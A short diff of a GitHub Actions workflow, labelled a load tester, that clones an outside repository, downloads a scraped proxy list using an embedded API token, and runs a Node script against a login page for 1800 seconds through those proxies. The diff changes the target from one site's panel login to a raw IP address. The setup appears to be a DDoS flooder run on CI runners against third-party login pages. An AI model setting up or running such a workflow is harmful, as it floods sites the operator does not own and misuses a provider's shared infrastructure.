@@ -30,7 +30,7 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm i chalk@4 colors request   hpack cluster   puppeteer-real-browser
+          npm i chalk@4 colors request   hpack cluster   
           pip install requests
           git clone https://github.com/Fegp1p2/ideal-guide.git
           chmod +x *
@@ -40,7 +40,7 @@ jobs:
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=A4eH8m71mK2U57785S5c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
           
-          node a.js GET  https://gyrange.in/panel/login 1800 4 1 woo.txt --bfm --debug
+          node h.js  http://98.89.1.180:2000/login 1800 4 h1
   
         
           
